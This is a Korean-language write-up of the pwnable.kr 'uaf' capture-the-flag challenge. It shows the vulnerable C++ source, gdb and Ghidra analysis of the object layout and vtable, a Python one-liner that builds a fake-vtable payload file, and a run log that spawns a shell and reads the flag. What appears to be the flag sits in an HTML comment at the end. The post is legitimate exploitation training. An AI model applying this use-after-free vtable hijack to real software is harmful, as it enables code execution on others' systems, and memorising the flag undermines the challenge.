---
title: "pwnable.kr - Toddler's bottle #15 uaf"
date: 2020-03-08
categories:
  - Information Security
tags:
  - pwnable.kr
---

[pwnable.kr][pwnable.kr] Toddler's bottle의 #15 uaf 문제 풀이

```c
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
	}
	virtual void introduce(){
		Human::introduce();
		cout << "I am a nice guy!" << endl;
	}
};

class Woman: public Human{
public:
	Woman(string name, int age){
		this->name = name;
		this->age = age;
	}
	virtual void introduce(){
		Human::introduce();
		cout << "I am a cute girl!" << endl;
	}
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;
}
```

uaf에 대충만 알고 있었기 때문에 이해하고 푸는데 시간이 좀 걸렸다...

gdb로 uaf를 열어 main을 disas해 보면 이런 부분이 있음
~~~
0x0000000000400ef7 <+51>:    lea    -0x50(%rbp),%r12
0x0000000000400efb <+55>:    mov    $0x18,%edi
0x0000000000400f00 <+60>:    callq  0x400d90 <_Znwm@plt>
~~~

이곳을 ghidra로 분석해 보면 이런 것임
~~~
local_40 = (long *)operator.new(0x18);
~~~

즉 여기가 new 할때 필요로 하는 버퍼 크기라는 것을 알 수 있다

여기서 사용하는 c++ class instance는 virtual function이 있으니 vptr이 있을 것이고, 또한 uaf.cpp를 보면 int age, string name을 선언하고 있다. 그렇다면 이것들의 배치는 이런식이다

s   : vptr (8 byte pointer)
s+8 : int age
s+16: string name (8 byte pointer)

사실 난 s+8이 아니라 s+4에 int age가 있고 string class instance가 그냥 local variable로 있을거라고 생각했는데 실제로 gdb로 해당 부분을 살펴보면 저런 식이었다.

~~~
(gdb) x/10gx 0x130cc50
0x130cc50:      0x0000000000401570      0x0000000000000019
0x130cc60:      0x000000000130cc38      0x0000000000000031
~~~

vptr에 해당하는 부분을 열어보면 이렇게 생겼다

~~~
(gdb) x/10x 0x0000000000401570
0x401570 <_ZTV3Man+16>: 0x000000000040117a      0x00000000004012d2
0x401580 <_ZTV5Human>:  0x0000000000000000      0x00000000004015f0
0x401590 <_ZTV5Human+16>:       0x000000000040117a      0x0000000000401192
0x4015a0 <_ZTS5Woman>:  0x00006e616d6f5735      0x0000000000000000
0x4015b0 <_ZTI5Woman>:  0x0000000000602390      0x00000000004015a0
~~~
~~~
(gdb) disas 0x040117a
Dump of assembler code for function _ZN5Human10give_shellEv:
   0x000000000040117a <+0>:     push   %rbp
   0x000000000040117b <+1>:     mov    %rsp,%rbp
   0x000000000040117e <+4>:     sub    $0x10,%rsp
   0x0000000000401182 <+8>:     mov    %rdi,-0x8(%rbp)
   0x0000000000401186 <+12>:    mov    $0x4014a8,%edi
   0x000000000040118b <+17>:    callq  0x400cc0 <system@plt>
   0x0000000000401190 <+22>:    leaveq
   0x0000000000401191 <+23>:    retq
End of assembler dump.
(gdb) disas 0x4012d2
Dump of assembler code for function _ZN3Man9introduceEv:
   0x00000000004012d2 <+0>:     push   %rbp
   0x00000000004012d3 <+1>:     mov    %rsp,%rbp
   0x00000000004012d6 <+4>:     sub    $0x10,%rsp
   0x00000000004012da <+8>:     mov    %rdi,-0x8(%rbp)
   0x00000000004012de <+12>:    mov    -0x8(%rbp),%rax
   0x00000000004012e2 <+16>:    mov    %rax,%rdi
   0x00000000004012e5 <+19>:    callq  0x401192 <_ZN5Human9introduceEv>
   0x00000000004012ea <+24>:    mov    $0x4014cd,%esi
   0x00000000004012ef <+29>:    mov    $0x602260,%edi
   0x00000000004012f4 <+34>:    callq  0x400cf0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x00000000004012f9 <+39>:    mov    $0x400d60,%esi
   0x00000000004012fe <+44>:    mov    %rax,%rdi
   0x0000000000401301 <+47>:    callq  0x400d50 <_ZNSolsEPFRSoS_E@plt>
   0x0000000000401306 <+52>:    leaveq
   0x0000000000401307 <+53>:    retq
End of assembler dump.
~~~

uaf.cpp에서 m->introduce() 하는 부분이 저 0x4012d2 일 것이다.
우리는 0x4012d2대신 0x040117a를 부르고 싶다

uaf.cpp에서 case1에서 m->introduce()를 부르는 곳을 disas해보면 이런식이다

~~~
=> 0x0000000000400fcd <+265>:   mov    -0x38(%rbp),%rax
   0x0000000000400fd1 <+269>:   mov    (%rax),%rax
   0x0000000000400fd4 <+272>:   add    $0x8,%rax
   0x0000000000400fd8 <+276>:   mov    (%rax),%rdx
   0x0000000000400fdb <+279>:   mov    -0x38(%rbp),%rax
   0x0000000000400fdf <+283>:   mov    %rax,%rdi
   0x0000000000400fe2 <+286>:   callq  *%rdx
~~~

여기에서 `add $0x8,%rax -> mov (%rax),%rdx -> callq  *%rdx` 하는게 실행의 수순이다

m,w는 0x18씩 두번 allocate했으니까

우리는 일단 저걸 free로 free해주고
0x18씩 두번 allocate, 그리고 vtable부분에 0x401570 대신 0x401570-0x8을 넣어두고, 그럼 add 0x8한게 0x401570이 될 것이고, 이걸 dereference하면 나오는게 0x40117a가 될 것이다

~~~
# uafinput 용 input 만들기
>>> oF = open('uafinput','wb')
>>> oF.write("\x68\x15\x40\x00\x00\x00\x00\x00"*3)
>>> oF.close()
>>> exit()
~~~

~~~
실행
uaf@pwnable:~$ ./uaf 24 /tmp/uafinput
1. use
2. after
3. free
3  //일단 둘다 free
1. use
2. after
3. free
2  //한번 allocate
your data is allocated
1. use
2. after
3. free
2  //또한번 allocate
your data is allocated
1. use
2. after
3. free
1  //m->introduce() 부르기. shell 실행 됨
$ cat flag
<tag output>
$
~~~

ㅋ

[pwnable.kr]: https://pwnable.kr

<!-- yay_f1ag_aft3r_pwning -->